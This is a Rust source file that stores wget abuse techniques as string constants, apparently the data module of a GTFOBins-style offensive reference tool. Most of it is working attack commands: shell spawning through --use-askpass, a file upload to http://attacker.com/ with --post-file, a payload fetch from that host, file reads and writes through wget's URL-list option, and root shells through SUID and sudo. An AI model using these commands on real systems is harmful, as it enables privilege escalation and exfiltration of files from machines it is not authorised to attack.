pub static BIN_NAME: &'static str = "wget";
pub static SH_CODE: &'static str = r#"
    
    TF=$(mktemp)
    chmod +x $TF
    echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
    wget --use-askpass=$TF 0
"#;
pub static FU_DESC: &'static str = "Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Use `--post-data` to send hard-coded data.";
pub static FU_CODE: &'static str = r#"
    
    URL=http://attacker.com/
    LFILE=file_to_send
    wget --post-file=$LFILE $URL
"#;
pub static FD_DESC: &'static str = "Fetch a remote file via HTTP GET request.";
pub static FD_CODE: &'static str = r#"
    
    URL=http://attacker.com/file_to_get
    LFILE=file_to_save
    wget $URL -O $LFILE
"#;
pub static FW_DESC: &'static str = "The data to be written is treated as a list of URLs, one per line, which are actually fetched by `wget`. The data is written, somewhat modified, as error messages, thus this is not suitable to write arbitrary binary data.";
pub static FW_CODE: &'static str = r#"
    
    LFILE=file_to_write
    TF=$(mktemp)
    echo DATA > $TF
    wget -i $TF -o $LFILE
"#;
pub static FR_DESC: &'static str = "The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages, thus this is not suitable to read arbitrary binary data.";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    wget -i $LFILE
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which wget) .

    TF=$(mktemp)
    chmod +x $TF
    echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
    ./wget --use-askpass=$TF 0
"#;
pub static SUDO_CODE: &'static str = r#"
    
    TF=$(mktemp)
    chmod +x $TF
    echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
    sudo wget --use-askpass=$TF 0
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static FU: Code<'static> = Code { 
	title: "FU_CODE",
	code: FU_CODE,
	tag: Tag::FU,
};
pub static FD: Code<'static> = Code { 
	title: "FD_CODE",
	code: FD_CODE,
	tag: Tag::FD,
};
pub static FW: Code<'static> = Code { 
	title: "FW_CODE",
	code: FW_CODE,
	tag: Tag::FW,
};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
